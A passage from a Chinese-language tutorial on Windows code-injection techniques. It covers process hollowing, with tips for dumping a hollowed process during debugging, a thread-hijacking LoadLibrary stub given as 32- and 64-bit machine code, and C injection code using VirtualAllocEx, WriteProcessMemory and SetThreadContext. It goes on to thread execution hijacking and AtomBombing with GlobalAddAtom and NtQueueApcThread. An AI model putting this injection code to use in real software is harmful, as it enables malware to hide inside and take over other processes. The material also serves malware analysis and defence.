
## 傀儡进程

3. `ZwUnmapViewOfSection` 卸载挂起进程内存空间数据；
4. `VirtualAlloc` 分配内存空间；
5. `WriteProcessMemory` 将恶意代码写入分配的内存；
6. `SetThreadContext` 设置挂起的进程的状态；
7. `ResumeThread` 唤醒进程运行。

傀儡进程是恶意软件隐藏自身代码的常用方式，在调试过程中，若遇到傀儡进程，需要将创建的子进程数据从内存中 dump 出来，作为 PE 文件单独调试，dump 的时机为 `ResumeThread` 调用之前，此时傀儡进程内存数据已经完全写入，进程还未正式开始运行。

若 dump 后文件无法运行，`OD` 加载失败，则需要做如下修复：

1. `FileAlignment` 值修改为 `SectionAlignment` 值；
2. 所有 section 的 `Raw Address` 值修改为 `Virtual Address`。

### 代码

#### 32位环境下的代码

```
0x68, 0xCC, 0xCC, 0xCC, 0xCC, // push 0xDEADBEEF (为返回地址占位)
0x9c, // pushfd (保存标志和寄存器)
0x60, // pushad
0x68, 0xCC, 0xCC, 0xCC, 0xCC, // push 0xDEADBEEF (为DLL路径名称占位)
0xb8, 0xCC, 0xCC, 0xCC, 0xCC, // mov eax, 0xDEADBEEF (为LoadLibrary函数占位)
0xff, 0xd0, // call eax (调用LoadLibrary函数)
0x61, // popad (恢复标志和寄存器)
0x9d, // popfd
0xc3                            // ret
```

#### 64位环境

```
0x50, // push rax (保存RAX寄存器)
0x48, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // mov rax, 0CCCCCCCCCCCCCCCCh (为返回地址占位)
0x9c, // pushfq
0x51, // push rcx
0x52, // push rdx
0x53, // push rbx
0x55, // push rbp
0x56, // push rsi
0x57, // push rdi
0x41, 0x50, // push r8
0x41, 0x51, // push r9
0x41, 0x52, // push r10
0x41, 0x53, // push r11
0x41, 0x54, // push r12
0x41, 0x55, // push r13
0x41, 0x56, // push r14
0x41, 0x57, // push r15
0x68, 0xef, 0xbe, 0xad, 0xde, // fastcall调用约定
0x48, 0xB9, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // mov rcx, 0CCCCCCCCCCCCCCCCh (为DLL路径名称占位)
0x48, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // mov rax, 0CCCCCCCCCCCCCCCCh (为LoadLibrary函数占位)
0xFF, 0xD0, // call rax (调用LoadLibrary函数)
0x58, // pop dummy
0x41, 0x5F, // pop r15
0x41, 0x5E, // pop r14
0x41, 0x5D, // pop r13
0x41, 0x5C, // pop r12
0x41, 0x5B, // pop r11
0x41, 0x5A, // pop r10
0x41, 0x59, // pop r9
0x41, 0x58, // pop r8
0x5F, // pop rdi
0x5E, // pop rsi
0x5D, // pop rbp
0x5B, // pop rbx
0x5A, // pop rdx
0x59, // pop rcx
0x9D, // popfq
0x58, // pop rax
0xC3 // ret
```

在我们想目标进程注入这段代码之前，以下占位符需要修改填充：

- 返回地址（代码桩执行完毕之后，线程恢复应回到的地址）
- DLL路径名称
- `LoadLibrary()` 函数地址

而这也是进行劫持，挂起，注入和恢复线程这一系列操作的时机。

**32位：**

```
memcpy((void *)((unsigned long)sc + 1), &oldIP, 4);
memcpy((void *)((unsigned long)sc + 8), &lpDllAddr, 4);
memcpy((void *)((unsigned long)sc + 13), &LoadLibraryAddress, 4);
```

**64位：**

```
memcpy(sc + 3, &oldIP, sizeof(oldIP));
memcpy(sc + 41, &lpDllAddr, sizeof(lpDllAddr));
memcpy(sc + 51, &LoadLibraryAddress, sizeof(LoadLibraryAddress));
```

**32位注入核心代码：**

```
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
DWORD LoadLibraryAddress = (DWORD)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
SIZE_T dwSize = (wcslen(pszLibFile) + 1) * sizeof(wchar_t);
LPVOID lpDllAddr = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
stub = VirtualAllocEx(hProcess, NULL, stubLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
BOOL bStatus = WriteProcessMemory(hProcess, lpDllAddr, pszLibFile, dwSize, NULL);
threadID = getThreadID(dwProcessId);
hThread = OpenThread((THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME), false, threadID);
ctx.ContextFlags = CONTEXT_CONTROL;
GetThreadContext(hThread, &ctx);
oldIP = ctx.Eip;
ctx.Eip = (DWORD)stub;
ctx.ContextFlags = CONTEXT_CONTROL;
VirtualProtect(sc, stubLen, PAGE_EXECUTE_READWRITE, &oldprot);
memcpy((void *)((unsigned long)sc + 1), &oldIP, 4);
memcpy((void *)((unsigned long)sc + 8), &lpDllAddr, 4);
memcpy((void *)((unsigned long)sc + 13), &LoadLibraryAddress, 4);
WriteProcessMemory(hProcess, stub, sc, stubLen, NULL);
SetThreadContext(hThread, &ctx);
ResumeThread(hThread);
```

64位同理；

## 线程执行劫持

线程执行劫持技术和傀儡进程技术相似，傀儡进程替换的是整个进程而线程执行劫持替换的只是某一个线程。

线程执行劫持也需要先在 `RWX` 内存中写入 `payload`，写入完毕后直接将线程执行地址替换为 `payload` 地址就行了：

```
HANDLE t = OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id); // 打开线程
SuspendThread(t); // 挂起线程
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_CONTROL;
ctx.Rip = (DWORD64)payload; // 设置线程新的执行地址
SetThreadContext(t, &ctx);
ResumeThread(t); // 唤醒线程
```

## Atom Bombing

### 1、Atom Table

`Atom Table` 是一个存储字符串和相应标识符的系统定义表。

应用程序将一个字符串放入一个 `Atom` 表中，并接收一个 16 位整数（`WORD`）作为标识（称为 `Atom`），可通过该标识访问字符串内容，实现进程间的数据交换。

#### 分类

1. **Global Atom Table**：所有应用程序可用。当一个进程将一个字符串保存到 `Global Atom Table` 时，系统生成一个在系统范围内唯一的 atom，来标示该字符串。在系统范围之内所有的进程都可以通过该 atom（索引）来获得这个字符串，从而实现进程间的数据交换。

2. **Local Atom Table**：只有当前程序可用，相当于定义一个全局变量，如果程序多次使用该变量，使用 `Local Atom Table` 仅需要一次内存操作。

#### 常用 API

添加一个 Global Atom：

```
ATOM WINAPI GlobalAddAtom(In LPCTSTR lpString);
```

删除一个 Global Atom：

```
ATOM WINAPI GlobalDeleteAtom(In ATOM nAtom);
```

查找指定字符串对应的 Global Atom：

```
ATOM WINAPI GlobalFindAtom(In LPCTSTR lpString);
```

获取指定 atom 对应的字符串：

```
UINT WINAPI GlobalGetAtomName(
  In  ATOM   nAtom,
  Out LPTSTR lpBuffer,
  In  int    nSize
);
```

### Atom Bombing 注入

#### 1、将任意数据写入目标进程地址空间中的任意位置

**整体思路：**

使用 `GlobalAddAtom` 创建一个原子，写入不含 `null` 的字符串，让目标进程调用 `GlobalGetAtomNameA` 就可以向目标进程任意地址写入任意代码了。

**细节：**

自身进程通过 `GlobalAddAtom` 将 shellcode 添加到 `Global Atom Table` 中。

通过 APC 注入（使用 APC 中的 `NtQueueApcThread` 函数令目标进程调用 `GlobalGetAtomNameA`。使用 `NtQueueApcThread` 而不是 `QueueUserAPC` 是因为 `GlobalGetAtomNameA` 有三个参数，`NtQueueApcThread` 能传递三个参数而 `QueueUserAPC` 只能传递一个参数），使目标进程调用 `GlobalGetAtomName`，即可从 `Global Atom Table` 中获取 shellcode。

**总结：**

通过 `GlobalAddAtom` 函数把数据放到原子表，用 APC 在目标线程用 `GlobalGetAtomName` 把原子表里的数据放到远程内存地址里。

```
HANDLE th = OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, thread_id);
for (char *pos = payload; pos < (payload + sizeof(payload)); pos += strlen(pos) + 1){
    ATOM a = GlobalAddAtomA(pos); // 添加全局原子
    DWORD64 offset = pos - payload;
    ntdll!NtQueueApcThread(th, GlobalGetAtomNameA, (PVOID)a, (PVOID)(((DWORD64)target_payload) + offset), (PVOID)(strlen(pos) + 1)); // 向目标逐字节写入payload
}
```

#### 2、执行 shellcode

目标进程调用 `GlobalGetAtomName` 从 `Global Atom Table` 中获取 shellcode 后，需要先保存 shellcode 再执行。

找到一段 `RW` 的内存（`KERNELBASE` 数据段后未使用的空间）写入数据，构造 ROP 链实现 shellcode 的执行。

ROP 链实现了以下功能：

1. 申请 `RWX` 内存；
2. 将 shellcode 从 `RW` 内存处拷贝到 `RWX` 内存中；
3. 执行。

注入后需要恢复目标进程的执行。

Windows 8.1 update 3 和 Windows 10 添加了一个新的保护机制 `CFG`。

## 利用内存映射文件实现注入

内存映射文件，是由一个文件到一块内存的映射。`Win32` 提供了允许应用程序把文件映射到一个进程的函数。
